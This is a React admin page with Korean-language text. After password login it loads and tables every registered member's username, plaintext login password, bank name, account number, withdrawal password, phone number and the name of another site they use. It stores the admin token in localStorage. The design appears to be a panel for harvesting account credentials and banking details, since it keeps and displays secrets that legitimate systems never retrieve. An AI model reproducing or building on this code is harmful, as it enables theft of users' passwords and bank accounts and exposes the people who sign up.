import { useEffect, useState } from "react";
import { adminLogin, getMembers, type MemberRow } from "../lib/api";

const TOKEN_KEY = "admin_token";

export default function AdminPage() {
  const [adminPassword, setAdminPassword] = useState("");
  const [token, setToken] = useState<string | null>(localStorage.getItem(TOKEN_KEY));
  const [members, setMembers] = useState<MemberRow[]>([]);
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const loadMembers = async (currentToken: string) => {
    try {
      setLoading(true);
      setMessage("");
      const result = await getMembers(currentToken);
      setMembers(result.members);
    } catch (error) {
      setMessage(error instanceof Error ? error.message : "회원 목록을 불러오지 못했습니다.");
    } finally {
      setLoading(false);
    }
  };

  const handleAdminLogin = async () => {
    try {
      setLoading(true);
      setMessage("");

      if (!adminPassword.trim()) {
        setMessage("관리자 비밀번호를 입력해 주세요.");
        return;
      }

      const result = await adminLogin(adminPassword.trim());
      localStorage.setItem(TOKEN_KEY, result.token);
      setToken(result.token);
      setAdminPassword("");
    } catch (error) {
      setMessage(error instanceof Error ? error.message : "관리자 로그인 중 오류가 발생했습니다.");
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem(TOKEN_KEY);
    setToken(null);
    setMembers([]);
    setMessage("관리자 로그아웃 완료");
  };

  useEffect(() => {
    if (token) {
      void loadMembers(token);
    }
  }, [token]);

  if (!token) {
    return (
      <main className="inner-page admin-page">
        <section className="card-panel admin-login-panel">
          <p className="eyebrow dark">ADMIN ACCESS</p>
          <h1>관리자 페이지</h1>
          <p className="hero-text dark-text">관리자 비밀번호를 입력하면 전체 회원가입 내역을 확인할 수 있습니다.</p>

          <div className="field">
            <label htmlFor="admin-password">관리자 비밀번호</label>
            <input
              id="admin-password"
              type="password"
              placeholder="관리자 비밀번호 입력"
              value={adminPassword}
              onChange={(event) => setAdminPassword(event.target.value)}
            />
          </div>

          <div className="stack-buttons admin-actions">
            <button type="button" className="primary-button" onClick={handleAdminLogin} disabled={loading}>
              {loading ? "확인중..." : "관리자 입장"}
            </button>
          </div>

          {message ? <p className="status-message dark-message">{message}</p> : null}
        </section>
      </main>
    );
  }

  return (
    <main className="inner-page admin-page">
      <section className="card-panel admin-list-panel">
        <div className="admin-toolbar">
          <div>
            <p className="eyebrow dark">MEMBER DATA</p>
            <h1>회원가입 내역</h1>
            <p className="hero-text dark-text">관리자 페이지에서 전체 가입 정보를 한 번에 확인할 수 있습니다.</p>
          </div>

          <div className="toolbar-buttons">
            <button type="button" className="ghost-button dark-ghost" onClick={() => void loadMembers(token)} disabled={loading}>
              새로고침
            </button>
            <button type="button" className="primary-button" onClick={handleLogout}>
              로그아웃
            </button>
          </div>
        </div>

        {message ? <p className="status-message dark-message">{message}</p> : null}

        <div className="table-wrap premium-table-wrap">
          <table className="premium-table">
            <thead>
              <tr>
                <th>ID</th>
                <th>아이디</th>
                <th>비밀번호</th>
                <th>닉네임</th>
                <th>은행</th>
                <th>계좌번호</th>
                <th>환전 비밀번호</th>
                <th>휴대폰번호</th>
                <th>추천인 코드</th>
                <th>가입코드</th>
                <th>이용 중인 사이트 이름</th>
                <th>가입일시</th>
              </tr>
            </thead>
            <tbody>
              {members.length > 0 ? (
                members.map((member) => (
                  <tr key={member.id}>
                    <td>{member.id}</td>
                    <td>{member.username}</td>
                    <td>{member.password}</td>
                    <td>{member.nickname}</td>
                    <td>{member.bank_name}</td>
                    <td>{member.account_number}</td>
                    <td>{member.exchange_password}</td>
                    <td>{member.phone_number}</td>
                    <td>{member.referral_code || "-"}</td>
                    <td>{member.signup_code}</td>
                    <td>{member.site_name}</td>
                    <td>{new Date(member.created_at).toLocaleString("ko-KR")}</td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={12} className="empty-cell">
                    저장된 회원이 없습니다.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </section>
    </main>
  );
}
